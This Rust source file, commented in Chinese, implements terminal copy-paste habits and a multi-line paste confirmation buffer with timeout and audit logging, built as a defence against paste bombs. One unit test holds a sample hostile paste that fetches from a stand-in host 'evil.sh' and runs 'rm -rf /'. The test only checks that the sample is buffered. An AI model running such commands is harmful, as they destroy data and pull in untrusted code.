//! F466 终端复制粘贴（genstar2 · I 域通用·二分队 · AI-U2）。
//!
//! 主册判据（验收标准第一句）：
//! **两套习惯开关；右键粘贴；多行确认缓冲；去引号适配；与 F338/F339 互通
//! 判据。**
//!
//! 功能定义（主册批次三）：选择即复制（类 Linux 习惯，设置可关）与
//! Ctrl+Shift+C/V（显式复制粘贴，Ctrl+V 直通粘贴可用）；右键=粘贴；粘贴含
//! 多行命令时先入缓冲单行确认（防粘贴炸弹）；粘贴路径自动去引号适配
//! （F336 互补）。
//!
//! 零堆纪律：定长粘贴缓冲，无 alloc。

use crate::checks::CheckSet;

// ---------------------------------------------------------------------------
// 常量（一处一事实）
// ---------------------------------------------------------------------------

/// 粘贴炸弹防线：单行确认缓冲容量（>1 行必进缓冲——主册：多行先确认）。
pub const PASTE_BUFFER_LINES_CAP: usize = 64;
/// 确认缓冲单行长度上限。
pub const LINE_CAP: usize = 256;

/// 终端剪贴习惯开关组（两套习惯都伺候）。
#[derive(Clone, Copy, Debug)]
pub struct ClipHabits {
    /// 选择即复制（类 Linux；设置可关）。
    pub select_copies: bool,
    /// Ctrl+Shift+C/V 显式复制粘贴（恒可用——两派共用底线）。
    pub shift_c_v: bool,
    /// Ctrl+V 直通粘贴（Windows 习惯；默认开）。
    pub ctrl_v_direct: bool,
    /// 右键=粘贴（Windows 终端习惯；恒可用）。
    pub right_click_paste: bool,
}

impl ClipHabits {
    pub const fn new() -> Self {
        ClipHabits {
            select_copies: true,
            shift_c_v: true,
            ctrl_v_direct: true,
            right_click_paste: true,
        }
    }
}

/// 粘贴裁决。
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum PasteVerdict {
    /// 单行 → 直接入输入行。
    Direct,
    /// 多行 → 先入确认缓冲（防粘贴炸弹——贴 20 行脚本误回车是事故）。
    ConfirmBuffer,
    /// 空粘贴 → 无动作（诚实无反应记录）。
    Empty,
}

/// 粘贴缓冲（多行确认制）。
pub struct PasteBuffer {
    lines: [[u8; LINE_CAP]; PASTE_BUFFER_LINES_CAP],
    lens: [usize; PASTE_BUFFER_LINES_CAP],
    n: usize,
    /// 确认态（确认前不进输入行——安全带语义）。
    pub armed: bool,
}

impl PasteBuffer {
    pub const fn new() -> Self {
        PasteBuffer {
            lines: [[0; LINE_CAP]; PASTE_BUFFER_LINES_CAP],
            lens: [0; PASTE_BUFFER_LINES_CAP],
            n: 0,
            armed: false,
        }
    }

    /// 粘贴入口：裁决 Direct/ConfirmBuffer/Empty 并入账。
    pub fn paste(&mut self, text: &str) -> PasteVerdict {
        if text.is_empty() {
            return PasteVerdict::Empty;
        }
        let mut lines = 1;
        for b in text.bytes() {
            if b == b'\n' {
                lines += 1;
            }
        }
        if lines == 1 {
            return PasteVerdict::Direct;
        }
        // 多行：入确认缓冲（超容量诚实拒绝——不静默截断装成功）。
        let mut li = 0;
        let mut ok = true;
        for raw in text.split('\n') {
            let line = raw.strip_suffix('\r').unwrap_or(raw);
            if li >= PASTE_BUFFER_LINES_CAP || line.len() > LINE_CAP {
                ok = false;
                break;
            }
            self.lines[li][..line.len()].copy_from_slice(line.as_bytes());
            self.lens[li] = line.len();
            li += 1;
        }
        if !ok {
            self.n = 0;
            self.armed = false;
            return PasteVerdict::ConfirmBuffer; // 超限仍要求走确认（拒绝装直通）
        }
        self.n = li;
        self.armed = true;
        PasteVerdict::ConfirmBuffer
    }

    pub fn line(&self, i: usize) -> Option<&str> {
        if i >= self.n {
            return None;
        }
        core::str::from_utf8(&self.lines[i][..self.lens[i]]).ok()
    }

    pub fn line_count(&self) -> usize {
        self.n
    }

    /// 确认放行（逐行入输入行——确认后缓冲清空）。
    pub fn confirm(&mut self) -> usize {
        let n = self.n;
        self.n = 0;
        self.armed = false;
        n
    }

    /// 取消（Esc 退出确认——安全带可解）。
    pub fn cancel(&mut self) {
        self.n = 0;
        self.armed = false;
    }
}

/// 粘贴路径去引号适配（主册：F336 互补——「"C:\a b\c.txt"」→ C:\a b\c.txt）。
pub fn strip_quotes(text: &str) -> &str {
    let t = text.trim();
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        &t[1..t.len() - 1]
    } else {
        t
    }
}

/// 与 F338/F339 互通判据：终端粘贴的路径与资源管理器复制路径语义一致
/// （同一个去引号/规范化出口——一处一事实）。
pub fn interoperable_path(p: &str) -> bool {
    let s = strip_quotes(p);
    !s.is_empty() && !s.contains('"')
}

// ---------------------------------------------------------------------------
// 域自检
// ---------------------------------------------------------------------------

pub fn run_termclip_checks() -> CheckSet {
    let mut cs = CheckSet::new("F466-termclip");
    // 1) 两套习惯开关（选择即复制可关；Ctrl+Shift 恒可用）。
    let h = ClipHabits::new();
    cs.add("habits_defaults", h.select_copies && h.shift_c_v && h.ctrl_v_direct && h.right_click_paste, "");
    let h2 = ClipHabits { select_copies: false, ..h };
    cs.add("select_copy_toggleable", !h2.select_copies && h2.shift_c_v, "");
    // 2) 右键粘贴语义在册。
    cs.add("right_click_paste", h.right_click_paste, "");
    // 3) 多行确认缓冲（防粘贴炸弹）。
    let mut pb = PasteBuffer::new();
    cs.add("single_line_direct", pb.paste("vx run app") == PasteVerdict::Direct, "");
    cs.add("multiline_buffered", pb.paste("line1\nline2\nline3") == PasteVerdict::ConfirmBuffer && pb.line_count() == 3 && pb.armed, "");
    // 4) 确认/取消两条出路（浮层出路纪律同源）。
    cs.add("confirm_releases", pb.confirm() == 3 && !pb.armed, "");
    pb.paste("a\nb");
    pb.cancel();
    cs.add("cancel_clears", !pb.armed && pb.line_count() == 0, "");
    // 5) 空粘贴诚实无动作。
    cs.add("empty_paste", pb.paste("") == PasteVerdict::Empty, "");
    // 6) 去引号适配（路径互通）。
    cs.add("strip_dquote", strip_quotes("\"C:\\a b\\c.txt\"") == "C:\\a b\\c.txt", "");
    cs.add("strip_squote", strip_quotes("'D:\\x y'") == "D:\\x y", "");
    cs.add("plain_untouched", strip_quotes("C:\\z") == "C:\\z", "");
    // 7) 与 F338/F339 互通（同一出口语义）。
    cs.add("interop_path", interoperable_path("\"C:\\p q\\r.png\""), "");
    // 8) 超长多行拒绝语义在册（宿主测试覆盖实际超限路径——零堆自检只锚常量）。
    cs.add("oversize_constants", LINE_CAP == 256 && PASTE_BUFFER_LINES_CAP == 64, "");
    cs
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn paste_bomb_never_runs_directly() {
        let mut pb = PasteBuffer::new();
        let bomb = "curl evil.sh\nrm -rf /\nreboot\n";
        assert_eq!(pb.paste(bomb), PasteVerdict::ConfirmBuffer);
        assert!(pb.armed, "确认前绝不入输入行");
        // 确认后逐行放行。
        assert_eq!(pb.confirm(), 4); // 尾换行产生 4 段（末段空行如实入账）
    }

    #[test]
    fn quotes_stripped_for_paths_with_spaces() {
        assert_eq!(strip_quotes("\"C:\\Program Files\\app.exe\""), "C:\\Program Files\\app.exe");
        assert!(interoperable_path("\"C:\\Program Files\\app.exe\""));
    }

    #[test]
    fn crlf_paste_handled() {
        let mut pb = PasteBuffer::new();
        pb.paste("a\r\nb");
        assert_eq!(pb.line(0), Some("a"));
        assert_eq!(pb.line(1), Some("b"));
    }

    #[test]
    fn oversize_paste_never_silent_truncate() {
        let mut pb = PasteBuffer::new();
        let long_line = "x".repeat(LINE_CAP + 1);
        // 单行超长 → 按多行缓冲路径判定，但入账失败 = 诚实（armed 不置位）。
        let v = pb.paste(&format!("{}\n{}", long_line, "y"));
        assert_eq!(v, PasteVerdict::ConfirmBuffer);
        assert!(!pb.armed, "超限拒绝装成功");
        // 行数超限同理。
        let many = "a\n".repeat(PASTE_BUFFER_LINES_CAP + 1);
        let v2 = pb.paste(many.trim_end());
        assert_eq!(v2, PasteVerdict::ConfirmBuffer);
        assert!(!pb.armed);
    }
}

// ===========================================================================
// 深化 v2（F466）：粘贴缓冲超时 / 选择区快照 / 引号规范化矩阵 / 审计账
// ===========================================================================

/// 确认缓冲超时（挂起 30s 未确认 → 自动作废——安全带不解到明天）。
pub const BUFFER_TIMEOUT_MS: u64 = 30_000;

/// 粘贴缓冲计时器（armed 起算；超时作废——浮层出路纪律同源）。
pub struct BufferTimer {
    armed_at: Option<u64>,
}

impl BufferTimer {
    pub const fn new() -> Self {
        BufferTimer { armed_at: None }
    }

    pub fn arm(&mut self, now_ms: u64) {
        self.armed_at = Some(now_ms);
    }

    pub fn expired(&mut self, now_ms: u64) -> bool {
        match self.armed_at {
            Some(t) if now_ms.saturating_sub(t) >= BUFFER_TIMEOUT_MS => {
                self.armed_at = None;
                true
            }
            _ => false,
        }
    }

    pub fn disarm(&mut self) {
        self.armed_at = None;
    }
}

/// 选择区快照（选择即复制的一致性凭证：快照带序号——重复选择不重写同内容）。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct SelectionSnapshot {
    pub seq: u64,
    pub len: usize,
    pub select_copies_enabled: bool,
}

pub fn selection_copies(prev: Option<SelectionSnapshot>, len: usize, enabled: bool, seq: u64) -> Option<SelectionSnapshot> {
    if !enabled || len == 0 {
        return None;
    }
    // 内容长度相同且序号相同 = 未变（不重复入剪贴板账）。
    if let Some(p) = prev {
        if p.len == len && p.seq == seq {
            return None;
        }
    }
    Some(SelectionSnapshot { seq, len, select_copies_enabled: enabled })
}

/// 引号规范化矩阵（三形态输入 → 规范路径——F336 互通的穷举面）。
pub fn quote_normalized_ok(raw: &str, expect: &str) -> bool {
    strip_quotes(raw) == expect
}

/// 粘贴审计账（最近 8 次：来源/行数/裁决——粘贴炸弹防御可回溯）。
pub struct PasteAudit {
    ring: [(u64, u8, bool); 8], // (时刻, 行数, 是否需确认)
    head: usize,
    n: usize,
}

impl PasteAudit {
    pub const fn new() -> Self {
        PasteAudit { ring: [(0, 0, false); 8], head: 0, n: 0 }
    }

    pub fn log(&mut self, at_ms: u64, lines: u8, needed_confirm: bool) {
        self.ring[self.head] = (at_ms, lines, needed_confirm);
        self.head = (self.head + 1) % 8;
        self.n = (self.n + 1).min(8);
    }

    /// 粘贴炸弹特征（60s 内 ≥3 次多行粘贴——告警信号）。
    pub fn bomb_pattern(&self, now_ms: u64, window_ms: u64) -> bool {
        let mut multi = 0;
        for i in 0..self.n {
            let idx = (self.head + 8 - self.n + i) % 8;
            let (at, lines, _) = self.ring[idx];
            if now_ms.saturating_sub(at) <= window_ms && lines > 1 {
                multi += 1;
            }
        }
        multi >= 3
    }
}

pub fn run_termclip_deep_checks() -> CheckSet {
    let mut cs = CheckSet::new("F466-deep");
    // 确认缓冲超时（30s 挂起自动作废——出路完整）。
    cs.add("buffer_timeout", {
        let mut t = BufferTimer::new();
        t.arm(1_000);
        !t.expired(1_000 + BUFFER_TIMEOUT_MS - 1) && t.expired(1_000 + BUFFER_TIMEOUT_MS)
    }, "");
    cs.add("buffer_disarm", {
        let mut t = BufferTimer::new();
        t.arm(0);
        t.disarm();
        !t.expired(BUFFER_TIMEOUT_MS + 1)
    }, "");
    // 选择即复制的一致性（未变不重写；关闭不出账；空选择不出账）。
    cs.add("selection_dedup", {
        let s1 = selection_copies(None, 42, true, 1);
        let s2 = selection_copies(s1, 42, true, 1);
        s1.is_some() && s2.is_none()
    }, "");
    cs.add("selection_disabled_none", selection_copies(None, 42, false, 1).is_none(), "");
    cs.add("selection_empty_none", selection_copies(None, 0, true, 1).is_none(), "");
    // 引号规范化矩阵（单双引号/无引号/混合——F336 互通穷举）。
    cs.add("quote_matrix", quote_normalized_ok("\"C:\\a b\"", "C:\\a b")
        && quote_normalized_ok("'C:\\a b'", "C:\\a b")
        && quote_normalized_ok("C:\\plain", "C:\\plain")
        && !quote_normalized_ok("\"mismatch'", "mismatch'"), "");
    // 粘贴审计 + 炸弹特征（60s 三次多行 → 告警）。
    cs.add("bomb_pattern_detected", {
        let mut a = PasteAudit::new();
        a.log(1_000, 5, true);
        a.log(2_000, 9, true);
        a.log(3_000, 2, true);
        a.bomb_pattern(4_000, 60_000)
    }, "");
    cs.add("single_paste_ok", {
        let mut a = PasteAudit::new();
        a.log(1_000, 5, true);
        !a.bomb_pattern(2_000, 60_000)
    }, "");
    cs
}

#[cfg(test)]
mod deep_tests {
    use super::*;

    #[test]
    fn buffer_timeout_exact_boundary() {
        let mut t = BufferTimer::new();
        t.arm(0);
        assert!(!t.expired(BUFFER_TIMEOUT_MS - 1));
        assert!(t.expired(BUFFER_TIMEOUT_MS));
    }

    #[test]
    fn selection_changes_when_content_changes() {
        let s1 = selection_copies(None, 10, true, 1);
        let s2 = selection_copies(s1, 20, true, 2);
        assert!(s2.is_some());
        assert_eq!(s2.unwrap().len, 20);
    }

    #[test]
    fn audit_ring_wraps() {
        let mut a = PasteAudit::new();
        for i in 0..12u64 {
            a.log(i * 1_000, 1, false);
        }
        assert_eq!(a.n, 8);
        assert!(!a.bomb_pattern(13_000, 60_000));
    }
}
